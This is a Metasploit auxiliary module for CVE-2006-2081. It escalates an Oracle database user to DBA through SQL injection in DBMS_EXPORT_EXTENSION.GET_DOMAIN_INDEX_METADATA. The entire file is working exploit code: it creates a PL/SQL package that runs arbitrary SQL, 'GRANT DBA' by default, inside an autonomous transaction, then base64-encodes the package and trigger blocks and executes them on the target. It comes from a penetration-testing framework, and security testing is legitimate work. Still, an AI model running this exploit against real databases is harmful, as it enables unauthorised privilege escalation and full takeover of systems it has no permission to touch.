##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle DB SQL Injection via DBMS_EXPORT_EXTENSION',
      'Description'    => %q{
        This module will escalate an Oracle DB user to DBA by exploiting a
        sql injection bug in the DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA package.

        Note: This module has been tested against 9i, 10gR1 and 10gR2.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2006-2081' ],
          [ 'OSVDB', '25002' ],
          [ 'BID', '17699' ],
          [ 'URL', 'http://www.red-database-security.com/exploits/oracle-sql-injection-oracle-dbms_export_extension.html' ],
        ],
      'DisclosureDate' => 'Apr 26 2006'))

      register_options(
        [
          OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
        ])
  end

  def run
    return if not check_dependencies

    name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)

    package = %Q|
create or replace package #{name} authid current_user is
function ODCIIndexGetMetadata (oindexinfo sys.odciindexinfo,P3 varchar2,p4 varchar2,env sys.odcienv)
return number;
end;
    |

    body = %Q|
create or replace package body #{name} is
function ODCIIndexGetMetadata (oindexinfo sys.odciindexinfo,P3 varchar2,p4 varchar2,env sys.odcienv)
return number is
pragma autonomous_transaction;
begin
execute immediate '#{datastore['SQL']}';
commit;
return(0);
end;
end;
    |

    sploit = %Q|
declare
#{rand1} pls_integer;
#{rand2} number;
#{rand3} varchar(32767);
begin
#{rand2} := 0;
#{rand3} := sys.dbms_export_extension.get_domain_index_metadata('#{name}', '#{datastore['DBUSER']}', '#{name}', '#{datastore['DBUSER']}', '', newblock => #{rand1}, gmflags => #{rand2});
end;
    |

    encoded_package = %Q|
declare
#{rand1} varchar2(32767);
begin
#{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{Rex::Text.encode_base64(package)}')));
execute immediate #{rand1};
end;
    |

    encoded_body = %Q|
declare
#{rand2} varchar2(32767);
begin
#{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{Rex::Text.encode_base64(body)}')));
execute immediate #{rand2};
end;
    |

    encoded_sploit = %Q|
declare
#{rand3} varchar2(32767);
begin
#{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{Rex::Text.encode_base64(sploit)}')));
execute immediate #{rand3};
end;
    |

    # Finally...
    print_status("Sending package '#{name}'...")
    prepare_exec(encoded_package)

    print_status("Sending body '#{name}'...")
    prepare_exec(encoded_body)

    print_status("Attempting sql injection on SYS.DBMS_EXPORT_EXTENSION...")
    prepare_exec(encoded_sploit)

    # Probably should do a 'drop package #{name}'
  end
end
